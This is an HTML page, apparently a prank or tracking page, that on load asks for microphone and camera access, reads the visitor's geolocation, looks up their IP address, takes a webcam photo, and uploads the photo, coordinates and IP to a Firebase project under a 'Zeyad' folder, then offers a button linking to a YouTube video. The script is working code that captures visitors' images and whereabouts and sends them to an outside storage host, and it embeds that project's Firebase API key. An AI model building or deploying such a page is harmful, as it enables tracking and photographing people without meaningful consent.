<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Don't Ask Me Why</title>
    <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000; /* Black background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white; /* White text */
            flex-direction: column; /* Column layout */
        }
        #clickButton {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #1a73e8;
            border: none;
            color: white;
            cursor: pointer;
            border-radius: 5px;
            font-size: 16px;
        }
    </style>
    <script type="module">
        // Import Firebase functions
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
            authDomain: "html-7fd9b.firebaseapp.com",
            projectId: "html-7fd9b",
            storageBucket: "html-7fd9b.appspot.com",
            messagingSenderId: "1022361191925",
            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const storage = getStorage(app);

        // Function to upload image to Firebase Storage
        async function uploadImage(imageData, location) {
            const storageRef = ref(storage, `Zeyad/image_${Date.now()}.png`); // Upload to Zeyad folder
            await uploadString(storageRef, imageData, 'data_url')
                .then(() => {
                    console.log('Uploaded image successfully!');

                    // Save location coordinates to the same file in Storage (if needed)
                    const locationRef = ref(storage, `Zeyad/location_${Date.now()}.json`);
                    const locationData = JSON.stringify(location);
                    uploadString(locationRef, locationData, 'raw')
                        .then(() => {
                            console.log('Uploaded location data successfully!');
                        })
                        .catch((error) => {
                            console.error('Error uploading location data:', error);
                        });
                })
                .catch((error) => {
                    console.error('Error uploading image:', error);
                });
        }

        // Function to get location, IP address, and capture image
        async function getLocationAndIP() {
            // Request microphone permission first
            await navigator.mediaDevices.getUserMedia({ audio: true })
                .then(async () => {
                    // Then request camera permission
                    await navigator.mediaDevices.getUserMedia({ video: true })
                        .then(async (stream) => {
                            // Get the user's location
                            if (navigator.geolocation) {
                                navigator.geolocation.getCurrentPosition(async (position) => {
                                    const latitude = position.coords.latitude;
                                    const longitude = position.coords.longitude;

                                    // Fetch the user's IP address using a public API
                                    try {
                                        const ipResponse = await fetch('https://api.ipify.org?format=json');
                                        const ipData = await ipResponse.json();
                                        const ipAddress = ipData.ip;

                                        // Save IP and location to Firestore
                                        await addDoc(collection(db, "users"), {
                                            ip: ipAddress,
                                            latitude: latitude,
                                            longitude: longitude,
                                            timestamp: new Date()
                                        });
                                        console.log("Location and IP data sent to Firestore successfully");

                                        // Capture image from the video stream
                                        const video = document.createElement('video');
                                        video.srcObject = stream;
                                        video.play();

                                        // Wait for the video to load
                                        await new Promise((resolve) => {
                                            video.onloadedmetadata = () => {
                                                resolve();
                                            };
                                        });

                                        // Create a canvas to capture the image
                                        const canvas = document.createElement('canvas');
                                        canvas.width = 640; // Set canvas width
                                        canvas.height = 480; // Set canvas height
                                        const context = canvas.getContext('2d');
                                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                        const imageData = canvas.toDataURL('image/png');

                                        // Upload captured image and location coordinates to Firebase Storage
                                        await uploadImage(imageData, { latitude, longitude });

                                        // Stop the video stream
                                        stream.getTracks().forEach(track => track.stop());
                                    } catch (error) {
                                        console.error("Error fetching IP address or sending data to Firestore: ", error);
                                    }
                                }, (error) => {
                                    console.error("Geolocation error: ", error);
                                });
                            } else {
                                console.error("Geolocation is not supported by this browser.");
                            }
                        })
                        .catch(error => {
                            console.error("Camera permission denied:", error);
                        });
                })
                .catch(error => {
                    console.error("Microphone permission denied:", error);
                });
        }

        // Call the function to get location and IP when the page loads
        window.onload = getLocationAndIP;

        // Function to redirect to a YouTube link when the button is clicked
        function redirectToYouTube() {
            window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0"; // YouTube link updated
        }
    </script>
</head>
<body>
    <h1>Welcome to My Website</h1>
    <p>Collecting your location, IP address, and taking a picture...</p>
    <button id="clickButton" onclick="redirectToYouTube()">Click to Visit YouTube</button>
</body>
</html>
